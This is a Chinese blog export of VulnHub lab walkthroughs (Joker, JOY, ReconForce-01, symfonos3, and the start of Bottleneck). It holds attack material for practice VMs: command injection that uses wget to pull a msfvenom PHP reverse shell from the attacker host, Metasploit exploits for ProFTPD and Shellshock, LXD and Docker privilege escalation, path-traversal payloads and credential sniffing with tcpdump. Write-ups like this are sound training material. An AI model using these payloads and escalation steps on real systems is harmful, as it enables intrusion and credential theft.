<img data-src="/images/vulnhub/HF2019 img/16.png" style="zoom:60%;" />

<p>最后就是root权限了</p>
<p>By oslo(A fake hacker)</p>
<h1 id="Joker-walkthrough"><a href="#Joker-walkthrough" class="headerlink" title="Joker walkthrough"></a>Joker walkthrough</h1><p>这次是个VMware的靶机 先打开看看</p>
<img data-src="/images/vulnhub/joker img/1.png" style="zoom:60%;" />

<p>然后打开kali扫一波 看看IP 192.168.0.120和相应的开了的端口</p>
<img data-src="/images/vulnhub/joker img/2.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/joker img/3.png" style="zoom:60%;" />

<p>然后扫一下端口   发现还开了个8080端口 访问发现需要密码登录 等下再看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap -sS -sV -T5 -A -p- 192.168.0.120</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/joker img/4.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/joker img/5.png" style="zoom:60%;" />

<p>先扫一下目录 发现了有两个等下 一个phpinfo和一个secret</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.0.120 -X .php,.txt,.html</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/joker img/6.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/joker img/7.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/joker img/8.png" style="zoom:60%;" />

<p>这里提示一个rock 应该可以用rockyou.txt来进行爆破</p>
<p>bp抓包爆破一下  抓包后发现被base64编码了</p>
<img data-src="/images/vulnhub/joker img/9.png" style="zoom:60%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">am9rZXI6MTIzNDY&#x3D;：joker:12346</span><br></pre></td></tr></table></figure>

<p>所以是用户名:密码   字典里面怎么改呢</p>
<p>注意到刚才txt文件里面提示100  应该是只需要前100就行 先把前100个提取出来 然后前面加上joker</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">head -n 100 rockyou.txt &gt; dict.txt</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/joker img/10.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/joker img/11.png" style="zoom:60%;" />

<p>最后密码是hannah  登录进去发现是个joomla的站</p>
<p>joomla默认的后台地址一般是 /administrator</p>
<img data-src="/images/vulnhub/joker img/13.png" style="zoom:60%;" />

<p>google了一下joomla的默认用户名和密码 joomla:joomla</p>
<p>进去了  然后看了看有什么功能</p>
<img data-src="/images/vulnhub/joker img/14.png" style="zoom:60%;" />

<p>然后在末模板bezz3里面将index.php的内容改成我们的获取shell的脚本</p>
<img data-src="/images/vulnhub/joker img/15.png" style="zoom:60%;" />

<p>再次访问主页 然后在kali机监听端口</p>
<img data-src="/images/vulnhub/joker img/16.png" style="zoom:60%;" />

<p>可以看到这里又有个lxd 后面提权应该也是靠这个 之前做过的一个靶机也是这样</p>
<p>这里我们直接执行命令 编译build-alpine就行了 然后生成一个镜像 靶机里面下载 然后在容器里面导入然后加载就可提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;saghul&#x2F;lxd-alpine-builder.git</span><br><span class="line">cd lxd-alpine-builder</span><br><span class="line">.&#x2F;build-alpine</span><br></pre></td></tr></table></figure>

<p>会生成一个tar.gz的文件 下载到靶机 在kali机用python开启http服务</p>
<img data-src="/images/vulnhub/joker img/17.png" style="zoom:60%;" />

<p>然后导入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lxc image import .&#x2F;alpine-v3.11-x86_64-20200212_0116.tar.gz --alias osloimage</span><br><span class="line">lxc image list</span><br><span class="line">lxc init osloimage ignite -c security.privileged&#x3D;true</span><br><span class="line">lxc config device add ignite mydevice disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</span><br><span class="line">lxc start ignite</span><br><span class="line">lxc exec ignite &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/joker img/18.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/joker img/19.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/joker img/20.png" style="zoom:60%;" />

<p>By oslo(A fake hacker)</p>
<h1 id="JOY-vm-Walkthrough"><a href="#JOY-vm-Walkthrough" class="headerlink" title="JOY vm Walkthrough"></a>JOY vm Walkthrough</h1><p>还是先打开靶机 是个Debian64的靶机</p>
<p>nmap先确定IP 192.168.0.119</p>
<img data-src="/images/vulnhub/JOY img/1.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/JOY img/3.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/JOY img/4.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/JOY img/2.png" style="zoom:60%;" />

<p>扫端口 可以看到开了很多端口  还是有个匿名登录的ftp端口</p>
<p>先看一下ftp端口里面有什么东西 直接网页访问就可以了</p>
<img data-src="/images/vulnhub/JOY img/5.png" style="zoom:60%;" />

<p>只在upload里面发现了有文件 download一点东西都没有</p>
<img data-src="/images/vulnhub/JOY img/6.png" style="zoom:60%;" />

<p>发现这里面的东西好像就directory有用 下载下来看看  里面是一个目录结构</p>
<img data-src="/images/vulnhub/JOY img/7.png" style="zoom:60%;" />

<p>有很多名字是字符串的txt文件 应该是没用的 先删了</p>
<img data-src="/images/vulnhub/JOY img/8.png" style="zoom:60%;" />

<p>其他都是正常的 有个haha和version_control 应该有点东西</p>
<p>haha的文件大小为0 看看version_control 应该是和版本有关</p>
<p>它的目录没有特殊的话应该就是/home/patrick/version_control</p>
<p>怎么下载到本地呢 还是使用连接ftp来下载文件 ftp不能直接切换目录来下载</p>
<p>扫端口看到21端口是开的 telnet试试 把文件复制到upload目录下 方便ftp下载</p>
<img data-src="/images/vulnhub/JOY img/9.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/JOY img/10.png" style="zoom:60%;" />

<p>然后查看内容</p>
<img data-src="/images/vulnhub/JOY img/11.png" style="zoom:60%;" />

<p>快有看到里面的一些版本信息和提示  网站目录放到了/var/www/tryingharderisjoy里面</p>
<p>然后看到各个版本信息 可以用  searchsploit搜索可以利用的exploit</p>
<img data-src="/images/vulnhub/JOY img/12.png" style="zoom:60%;" />

<p>这里找到了 proftpd有个RCE可以利用</p>
<p>试试这个 excellent yes</p>
<img data-src="/images/vulnhub/JOY img/13.png" style="zoom:200%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search proftpd 1.3.5</span><br><span class="line">use exploit&#x2F;unix&#x2F;ftp&#x2F;proftpd_modcopy_exec</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.0.107</span><br><span class="line">set sitepath &#x2F;var&#x2F;www&#x2F;tryingharderisjoy</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/JOY img/14.png" style="zoom:60%;" />

<p>在这个目录下有个ossec 进去看看 应该会有很多配置文件</p>
<img data-src="/images/vulnhub/JOY img/15.png" style="zoom:60%;" />

<p>注意有个patricksecretsofjoy 看看</p>
<p>嗯？ 直接就出来密码了</p>
<img data-src="/images/vulnhub/JOY img/16.png" style="zoom:60%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">patrick:apollo098765</span><br><span class="line">root:howtheheckdoiknowwhattherootpasswordis</span><br></pre></td></tr></table></figure>

<p>切换用户成功 但切换root失败</p>
<img data-src="/images/vulnhub/JOY img/17.png" style="zoom:60%;" />

<p>那就看看权限和可执行文件 但是我们没有权限进入这个可执行文件的目录</p>
<img data-src="/images/vulnhub/JOY img/18.png" style="zoom:60%;" />

<p>先执行一遍</p>
<img data-src="/images/vulnhub/JOY img/19.png" style="zoom:60%;" />

<p>这里我们可以自己修改这个test 改成提权用的/bin/bash</p>
<p>然后像刚才哪有telnet上去 使用cpto覆盖原来的test文件</p>
<img data-src="/images/vulnhub/JOY img/20.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/JOY img/21.png" style="zoom:60%;" />

<p>然后在执行一遍test</p>
<img data-src="/images/vulnhub/JOY img/22.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/JOY img/23.png" style="zoom:60%;" />

<p>By oslo(A fake hacker)</p>
<h1 id="ReconForce-01-Walkrhrough"><a href="#ReconForce-01-Walkrhrough" class="headerlink" title="ReconForce-01 Walkrhrough"></a>ReconForce-01 Walkrhrough</h1><p>先开启靶机  是个ubuntu的系统</p>
<p>![](/images/vulnhub/ReconForce img/1.png)</p>
<p>nmap扫一下 确定一下IP  是这个192.168.0.111的IP 然后顺便扫一下端口</p>
<img data-src="/images/vulnhub/ReconForce img/2.png" style="zoom:50%;" />

<p>好像有点东西  ftp可以匿名登录</p>
<img data-src="/images/vulnhub/ReconForce img/3.png" style="zoom:50%;" />

<p>然后访问一下这个ip  看看页面网站有没有什么东西 这页面挺酷的…</p>
<img data-src="/images/vulnhub/ReconForce img/4.png" style="zoom:50%;" />

<p>然后dirsearch 还有gobuster扫一遍 查看源码  有个5ecure 然后有个登录框 猜测应该可以爆破(点击TroubleShoot 弹出登录框)</p>
<p>用户名猜测为admin  密码又不知道  之前扫端口的时候发现ftp可以匿名登录 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp 192.168.0.111</span><br></pre></td></tr></table></figure>

<p>用户名和密码都为ftp</p>
<img data-src="/images/vulnhub/ReconForce img/5.png" style="zoom:50%;" />

<p>什么都没有  倒是有个Secure@hackNos</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名：admin</span><br><span class="line">密码：Security@hackNos</span><br></pre></td></tr></table></figure>

<p>登录成功  发现ping命令框  之前打CTF的时候遇到过  命令诸注入  先ping一个试试</p>
<p>![](/images/vulnhub/ReconForce img/6.png)直接使用命令不行  结果返回页面无回显 前面要加一个管道符</p>
<img data-src="/images/vulnhub/ReconForce img/7.png" style="zoom:67%;" />

<img data-src="/images/vulnhub/ReconForce img/8.png" style="zoom:60%;" />

<p>没有其他的过滤  可以思考关于该如何反弹shell了</p>
<p>可以直接使用msfvenom创建一个php反向外壳   之后复制到oslo.php 然后执行wget命令 先试试看行不行</p>
<p>先用msfvenom生成payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.0.112 lport&#x3D;9999 -f raw</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/ReconForce img/9.png" style="zoom:50%;" />

<p>然后复制到oslo.php  然后本机用python开启一个http服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 9999</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/ReconForce img/10.png" style="zoom:60%;" />

<p>然后在刚才那个执行命令界面网页执行wget命令 记得加 |</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|wget http:&#x2F;&#x2F;192.168.0.112:99&#x2F;oslo.php</span><br></pre></td></tr></table></figure>

<p>下载成功后在本机的命令行有回显</p>
<img data-src="/images/vulnhub/ReconForce img/11.png" style="zoom:60%;" />

<p>然后再执行  执行后就直接收到了meterpreter反弹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|php oslo.php</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/ReconForce img/12.png" style="zoom:60%;" />

<p>现在我们需要一个交互式的shell  所以执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spwan(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/ReconForce img/13.png" style="zoom:60%;" />

<p>先看看有没有什么东西  到home目录下有个recon目录 进去后有个user.txt</p>
<img data-src="/images/vulnhub/ReconForce img/14.png" style="zoom:60%;" />

<p>然后看了一下/etc/passwd</p>
<img data-src="/images/vulnhub/ReconForce img/15.png" style="zoom:60%;" />

<p>有个recon用户 但是不知道密码啊  emm…  之前有个5ecure和Security@hackNos的提示</p>
<img data-src="/images/vulnhub/ReconForce img/16.png" style="zoom:60%;" />

<p>5ecure不行 Security@hackNos可以</p>
<p>先看看可执行文件  也有个/bin/at kali有自带的exploit  先打来试试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">sudo -l 查看可执行权限 发现recon可以执行所有命令 all权限</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/ReconForce img/17.png" style="zoom:60%;" />



<img data-src="/images/vulnhub/ReconForce img/18.png" style="zoom:60%;" />

<p>然后就sudo su - 嘿嘿  果然就这样提权了 </p>
<img data-src="/images/vulnhub/ReconForce img/19.png" style="zoom:60%;" />

<p>后来看了作者的walkthrough 发现应该是docker提权</p>
<p>但是当我查看recon用户的id时  发现有个docker镜像  docker提权</p>
<p>先使用docker安装虚拟映像ubuntu</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run ubuntu</span><br></pre></td></tr></table></figure>

<p>然后运行命令docker run 用-it交互模式 -v详细 以及安装点或映像文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it -v &#x2F;root:&#x2F;mnt ubuntu</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/ReconForce img/20.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/ReconForce img/21.png" style="zoom:60%;" />

<p>最后提权是有两种方法By oslo(A fake hacker)</p>
<p>By oslo(A fake hacker)</p>
<h1 id="symfonos3-walkthrough"><a href="#symfonos3-walkthrough" class="headerlink" title="symfonos3 walkthrough"></a>symfonos3 walkthrough</h1><p>先打开靶机 然后kali用nmap扫一波确定IP</p>
<img data-src="/images/vulnhub/symfonos3 img/1.png" style="zoom:60%;" />

<p>然后扫一下端口</p>
<img data-src="/images/vulnhub/symfonos3 img/2.png" style="zoom:60%;" />

<p>21和22日常端口 80的http  先访问一下页面 看看是个什么东西</p>
<img data-src="/images/vulnhub/symfonos3 img/3.png" style="zoom:60%;" />

<p>页面挺唬人的  还是先扫一波目录  gobuster和dirsearch还有dirb来扫一波</p>
<p>dirsearch只扫出一个index.html 然后用gobuster扫一波</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">py -3 dirsearch.py -u http:&#x2F;&#x2F;192.168.0.121 -e all</span><br><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.0.121 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt -x .php,.txt,.html,.zip</span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.0.121 -X .php,.html,.txt,.zip</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/symfonos3 img/4.png" style="zoom:60%;" />

<p>只扫出来一个/gate页面</p>
<img data-src="/images/vulnhub/symfonos3 img/5.png" style="zoom:60%;" />

<p>然后又对/gate扫一波目录  有一个cerberus</p>
<p>在看一下这个cerberus emm  开始唬人 这个单词意思就是地狱犬</p>
<img data-src="/images/vulnhub/symfonos3 img/6.png" style="zoom:60%;" />

<p>扫出来还有个/cgi-bin/underworld目录</p>
<img data-src="/images/vulnhub/symfonos3 img/7.png" style="zoom:60%;" />

<p>访问一遍发现是个命令执行回显  google了一下 发现是执行了uptime</p>
<img data-src="/images/vulnhub/symfonos3 img/8.png" style="zoom:60%;" />

<p>访问目录下的其他页面 发现都是一样的命令回显</p>
<p>直接就有命令回显了  这是怎么回事 然后问了一下大佬 说这可能是shellshock</p>
<p>因为它的目录结构是在/cgi-bin下 可以用msf直接打</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search shellshock</span><br><span class="line">use exploit&#x2F;multi&#x2F;http&#x2F;apache_mod_cgi_bash_env_exec</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.0.110</span><br><span class="line">set targeturi &#x2F;cgi-bin&#x2F;underworld</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/symfonos3 img/9.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/symfonos3 img/10.png" style="zoom:60%;" />

<p>然后下面开始提权 查看一下权限 可执行文件 可写文件 还有相关文件</p>
<p>只有在/etc/passwd文件里发现了另一个用户</p>
<img data-src="/images/vulnhub/symfonos3 img/11.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/symfonos3 img/12.png" style="zoom:60%;" />

<p>试一下切换用户 但是需要密码 无法切换</p>
<p>下面的我自己没有想到该怎么提权 于是看了其他人的walkthrough再来做的</p>
<p>这里我们可以先跑一下linuxprivchecker.py 来收集更多的信息</p>
<p>然后会在里面找到有安装了tcpdump</p>
<img data-src="/images/vulnhub/symfonos3 img/13.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/symfonos3 img/14.png" style="zoom:60%;" />

<p>然后后面的思路就是抓取数据包 然后在数据包里面可以找到hades的密码 </p>
<p>这里就涉及ftp协议 要了解到ftp是明文传输的 而且也要想到去抓取数据包来获取密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">tcpdump -D</span><br><span class="line">tcpdump -w file.pcap -i lo</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/symfonos3 img/15.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/symfonos3 img/16.png" style="zoom:60%;" />

<p>然后在wireshark里面打开pcap文件 追踪tcp流来找到找到用户密码</p>
<p>然后过滤端口tcp.port==21  然后右键追踪tcp流</p>
<img data-src="/images/vulnhub/symfonos3 img/17.png" style="zoom:60%;" />

<p>得到密码：USER hades  PASS PTpZTfU4vxgzvRBE</p>
<p>然后使用这个账户切换用户</p>
<img data-src="/images/vulnhub/symfonos3 img/18.png" style="zoom:60%;" />

<p>然后下面可以用一个叫pspy的工具来进行检测 现在kali上下载 然后上传到靶机</p>
<p>运行一遍pspy后  会发现一个ftpclient.py文件 </p>
<p>在目录/opt/ftpclient下</p>
<p>![](/images/vulnhub/symfonos3 img/19.png)</p>
<p>会发现这个文件是以root权限运行的 所以我们可以修改其中的内容 然后再次运行来获取权限</p>
<img data-src="/images/vulnhub/symfonos3 img/20.png" style="zoom:60%;" />

<p>然后在kali监听这个端口就行 这个脚本会自动执行  就可以直接是root权限了</p>
<img data-src="/images/vulnhub/symfonos3 img/21.png" style="zoom:60%;" />

<p>By oslo(A fake hacker)</p>
]]></content>
      <categories>
        <category>Walkthrough</category>
      </categories>
      <tags>
        <tag>VulnHub</tag>
        <tag>Walkthrough</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub Walkthrough(一)</title>
    <url>/2020/03/18/VulnHub-Walkthrough-%E4%B8%80/</url>
    <content><![CDATA[<h1 id="十篇-walkthrough-一"><a href="#十篇-walkthrough-一" class="headerlink" title="十篇 walkthrough(一)"></a>十篇 walkthrough(一)</h1><a id="more"></a> 

<h1 id="Bottleneck-walkthrough"><a href="#Bottleneck-walkthrough" class="headerlink" title="Bottleneck walkthrough"></a>Bottleneck walkthrough</h1><h2 id="写在前面：P"><a href="#写在前面：P" class="headerlink" title="写在前面：P"></a>写在前面：P</h2><p>最近看了 <strong>ins1ght</strong> 老哥写的很多VulnHub的walkthrough，感觉很好玩，自己也一直想搞搞vulnhub的靶场来玩玩，奈何自己太菜了</p>
<p>后来问了 <strong>ins1ght</strong> 老哥，靶场直接下载下来就可以用，而且也是个锻炼自己的方式，也可以给自己的博客多一篇水文 所有就试着搞了一下 然后写了这第一篇的vulnhub的walkthrough</p>
<h2 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h2><p>靶机介绍：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Bottleneck is an intermediate boot2root machine.</span><br><span class="line">After some cyber attacks the admin hardened the system, show him that it&#39;s not so secure.</span><br><span class="line">If you need a hint feel free to contact me on Twitter: @bytevsbyt3</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20v" title="https://www.vulnhub.com/">VulnHub官网<i class="fa fa-external-link"></i></span></p>
<p>VulnHub我就不多介绍了 网上很多相关的介绍 官网也有很多靶场可以下载</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYm90dGxlbmVjay0xLDM3NC8=" title="https://www.vulnhub.com/entry/bottleneck-1,374/">Bottleneck靶机地址<i class="fa fa-external-link"></i></span></p>
<p>靶机下载下来可以直接使用 虚拟机导入(我用的vmware15) 然后直接开启虚拟机 就不用管了</p>
<h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><p>第一步都是信息收集 常规套路就不多说了 这篇文章可以看一下</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE0Mjc2Ny5odG1s" title="https://www.freebuf.com/articles/web/142767.html">信息收集浅谈<i class="fa fa-external-link"></i></span></p>
<p>靶机是个ubuntu系统</p>
<img data-src="/images/vulnhub/botteneck img/1.png" style="zoom:45%;" />

<p>(这里打开靶机的时候走了一个坑 应该是用VirtualBox导入它提供的ova文件</p>
<p>然后正常启动就可以了)</p>
<p>攻击机我用的Kali Kali也不多说了(kali用好 牢饭管好)</p>
<p>可以先用nmap扫一下网段内的主机(nmap用法google就可以了 我这里就直接用了)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap -sP -PI -PT 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/botteneck img/2.png" style="zoom:45%;" />

<p>我用的VirtualBox开得虚拟机 当然就是这个IP了</p>
<p>也可以在浏览器访问一下这个IP来判断是不是靶机</p>
<img data-src="/images/vulnhub/botteneck img/3.png" style="zoom:50%;" />

<p>下面我们可以收集收集有没有一些敏感信息泄露的地方(扫一波目录先)</p>
<p>我用的是dirsearch(Github上面有 可以自己下载使用)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">py -3 dirsearch.py -u http:&#x2F;&#x2F;192.168.1.104 -e all</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/botteneck img/4.png" style="zoom:50%;" />

<p>扫了之后发现只有一个index.php 应该就是显示的首页 其他的是几个文件夹</p>
<p>然后借鉴了<strong>ins1ght</strong>老哥用的gobuster来枚举还有没有其他一些东西 使用gobuster需要自己建一个字典(-w 参数)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.104 -w &#x2F;root&#x2F;桌面&#x2F;big_dict.txt -x .php,.txt,.html,.zip</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/botteneck img/5.png" style="zoom:50%;" />

<img data-src="C:\Users\Administrator\Desktop\Folders\blog\botteneck img\6.png" style="zoom:50%;" />

<p>上面图片是一些枚举的结果</p>
<p>目前得到的目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;css</span><br><span class="line">&#x2F;img</span><br><span class="line">&#x2F;js</span><br><span class="line">&#x2F;vendor</span><br><span class="line">&#x2F;index.php</span><br><span class="line">&#x2F;image_gallery.php</span><br></pre></td></tr></table></figure>

<p>可以在浏览器访问一下首页</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.104&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p>(emm… 面具挺好看)</p>
<p>拿我们之前gobuster扫出来的东西试试 挨个访问一下 也是毛都没有</p>
<p>不过还有一个image_gallery.php 访问一下试试 然后就发现有点东西了</p>
<img data-src="/images/vulnhub/botteneck img/7.png" style="zoom:50%;" />

<p>这段base64拿去解码出来就是bottleneck_dontbe.png 访问一下</p>
<p>在img文件夹下能访问到</p>
<img data-src="/images/vulnhub/botteneck img/8.png" style="zoom:50%;" />

<p>这不就让我想到了之前打DDCTF的一道题 构造文件名的base64 任意文件的读取<br>刚才上面gobuster扫出来的试了一波 什么都不能读到 虽然返回状态是200 但是服务器应该做了限制 所以这里任意文件读取是没有利用点的</p>
<p>在这可以看到这些应该是访问返回这张图片的数据流</p>
<img data-src="/images/vulnhub/botteneck img/9.png" style="zoom:50%;" />

<p>能读到PNG图片的数据流 又问了一下<strong>ins1ght</strong>老哥 自己还是太菜了 老哥说考虑往LFI(本地文件包含)的利用点试一下 <span class="exturl" data-url="aHR0cDovL3d3dy5vc2xvLm1vbnN0ZXIvMjAxOS8xMS8yMC9Cb3R0bGVuZWNr6Z225py6V2Fsa3Rocm91Z2gvW2h0dHBzOi8vY2h5YmV0YS5naXRodWIuaW8vMjAxNy8xMC8wOC9waHDmlofku7bljIXlkKvmvI/mtJ4vXShodHRwczovL2NoeWJldGEuZ2l0aHViLmlvLzIwMTcvMTAvMDgvcGhw5paH5Lu25YyF5ZCr5ryP5rSeLyk=" title="http://www.oslo.monster/2019/11/20/Bottleneck靶机Walkthrough/[https://chybeta.github.io/2017/10/08/php文件包含漏洞/](https://chybeta.github.io/2017/10/08/php文件包含漏洞/)">文件包含参考(chybeta师傅tql)<i class="fa fa-external-link"></i></span></p>
<p>最后可以用nmap扫一下开放的端口和服务之类的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -T4 -A -p- 192.168.1.104</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/botteneck img/10.png" style="zoom:50%;" />

<p>OK 扫到这里就发现有点东西了 SSH的22端口 HTTP默认的80端口</p>
<p>服务器是Nginx 那我们就知道一点简单的信息(IP+端口+服务器)</p>
<h2 id="0x01-LFI利用点"><a href="#0x01-LFI利用点" class="headerlink" title="0x01 LFI利用点"></a>0x01 LFI利用点</h2><p>既然发现是LFI的洞 先重发一下能不能读到返回的内容</p>
<p>用Bp 抓包重放一下试试</p>
<img data-src="/images/vulnhub/botteneck img/11.png" style="zoom:50%;" />

<p>这里看到返回是 200 但是却什么东西都没有 再多抓几次 看看t这个参数是不是有猫腻</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t&#x3D;1574390048&amp;f&#x3D;Ym90dGxlbmVja19kb250YmUucG5n</span><br><span class="line">t&#x3D;1574389727&amp;f&#x3D;Ym90dGxlbmVja19kb250YmUucG5n</span><br></pre></td></tr></table></figure>

<p>这里可以看到t已经变了 f没变 所以这里就可以想到f之前转码后是文件名 应该是不会变的 而这个t 猜的话应该就是时间戳(TimeStamp) 而我们想要得到东西的话 我们传的这个参数t的值应该是要和服务器一致的才行 先看看攻击机和靶机的时间</p>
<img data-src="/images/vulnhub/botteneck img/12.png" style="zoom:50%;" />

<p>感觉没差多少 应该是一致的 那么我们就可以写个对应的脚本跑一下</p>
<p>(exp脚本我这里就不放了 怕有人来敲门)</p>
<p>先构造一个字典 字典里面用最开始gobuster扫出来的那些内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bottleneck_dontbe.png</span><br></pre></td></tr></table></figure>

<p>可以先用脚本跑一下能不能获取到这个图片的内容 获取到之后直接后缀名改png可以正常查看图片内容 那就脚本可用 就继续试一下其他payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;passwd.php</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd.php</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd.php</span><br></pre></td></tr></table></figure>

<p>返回了这个东西</p>
<img data-src="/images/vulnhub/botteneck img/13.png" style="zoom:50%;" />

<p>emm 继续搞 读一下php源码试试(image_gallery.php)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;*</span><br><span class="line">CHANGELOG</span><br><span class="line">v1.1: Still testing without content.I&#39;ve fixed that problem that @p4w and @ska notified me after hacker attack.Shit I&#39;m too lazy to make a big review of my code.I think that the LFI problem can be mitigated with the blacklist.By the way to protect me from attackers, all malicious requests are immediately sent to the SOC</span><br><span class="line">v1.0: Starting this beautiful gallery</span><br><span class="line">*&#x2F;</span><br><span class="line">$tstamp &#x3D; time();</span><br><span class="line">if(isset($_GET[&#39;t&#39;]) &amp;&amp; isset($_GET[&#39;f&#39;]))&#123;</span><br><span class="line">    include_once &#39;image_gallery_load.php&#39;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>读到的源文件的前面一部分 可以看到changelog哪里说明是LFI漏洞了</p>
<p>下面代码看到还有一个image_gallery_load.php的文件 那就在读一下</p>
<img data-src="/images/vulnhub/botteneck img/14.png" style="zoom:50%;" />

<p>下面是源码：</p>
